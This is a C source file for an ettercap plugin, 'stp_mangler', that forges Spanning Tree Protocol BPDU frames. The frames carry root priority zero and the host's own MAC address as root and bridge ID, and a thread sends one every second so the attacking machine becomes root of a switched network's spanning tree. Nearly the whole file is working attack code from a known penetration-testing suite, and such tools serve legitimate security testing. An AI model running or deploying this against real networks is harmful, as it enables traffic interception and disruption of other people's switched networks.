/*
    stp_mangler -- ettercap plugin -- Become root of a switches spanning tree 

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_threads.h>

/* globals */
struct eth_header
{
   u_int8   dha[ETH_ADDR_LEN];       /* destination eth addr */
   u_int8   sha[ETH_ADDR_LEN];       /* source ether addr */
   u_int16  proto;                   /* packet type ID field */
};

struct llc_header
{ 
    u_int8   dsap;
    u_int8   ssap;
    u_int8   cf;
    u_int16  protocolid;
    u_int8   version;
    u_int8   BPDU_type;
    u_int8   BPDU_flags;
};

struct stp_header 
{
    u_int16  root_priority;
    u_int8   root_id[6];
    u_int8   root_path_cost[4];
    u_int16  bridge_priority;
    u_int8   bridge_id[6];
    u_int16  port_id;
    u_int16  message_age;
    u_int16  max_age;
    u_int16  hello_time;
    u_int16  forward_delay;
};

#define FAKE_PCK_LEN 60
struct packet_object fake_po;
char fake_pck[FAKE_PCK_LEN];


/* protos */
int plugin_load(void *);
static int stp_mangler_init(void *);
static int stp_mangler_fini(void *);
EC_THREAD_FUNC(mangler);


/* plugin operations */

struct plugin_ops stp_mangler_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "stp_mangler",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Become root of a switches spanning tree",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &stp_mangler_init,
   /* deactivation function */                     
   .fini =              &stp_mangler_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &stp_mangler_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int stp_mangler_init(void *dummy) 
{     
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("stp_mangler: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }
      
   INSTANT_USER_MSG("stp_mangler: Start sending fake STP packets...\n");

   /* create the flooding thread */
   ec_thread_new("mangler", "STP mangler thread", &mangler, NULL);
        
   return PLUGIN_RUNNING;
}


static int stp_mangler_fini(void *dummy) 
{
   pthread_t pid;

   pid = ec_thread_getpid("mangler");

   /* the thread is active or not ? */
   if (!pthread_equal(pid, EC_PTHREAD_NULL))
      ec_thread_destroy(pid);

   INSTANT_USER_MSG("stp_mangler: plugin stopped...\n");

   return PLUGIN_FINISHED;
}


EC_THREAD_FUNC(mangler)
{
   struct eth_header *heth;
   struct llc_header *hllc;
   struct stp_header *hstp;
   u_char MultiMAC[6]={0x01,0x80,0xc2,0x00,0x00,0x00};

   /* Avoid crappy compiler alignment :( */    
   heth  = (struct eth_header *)fake_pck;
   hllc  = (struct llc_header *)(fake_pck + 14);
   hstp  = (struct stp_header *)(fake_pck + 22);
   
   /* Create a fake STP packet */
   heth->proto = htons(0x0026);
   memcpy(heth->dha, MultiMAC, ETH_ADDR_LEN);
   memcpy(heth->sha, GBL_IFACE->mac, ETH_ADDR_LEN);

   hllc->dsap = 0x42;
   hllc->ssap = 0x42;
   hllc->cf   = 0x03;
   
   hstp->root_priority = 0;
   memcpy(hstp->root_id, GBL_IFACE->mac, ETH_ADDR_LEN);
   hstp->bridge_priority = 0;
   memcpy(hstp->bridge_id, GBL_IFACE->mac, ETH_ADDR_LEN);
   hstp->port_id = htons(0x8000);
   hstp->max_age = htons_inv(20);
   hstp->hello_time = htons_inv(2);
   hstp->forward_delay = htons_inv(15);

   packet_create_object(&fake_po, (u_char*)fake_pck, FAKE_PCK_LEN);

   /* init the thread and wait for start up */
   ec_thread_init();
   
   LOOP {
      CANCELLATION_POINT();

      /* Send on the wire and wait */
      send_to_L2(&fake_po); 
      sleep(1);
   }
   
   return NULL; 
}

/* EOF */

// vim:ts=3:expandtab
 
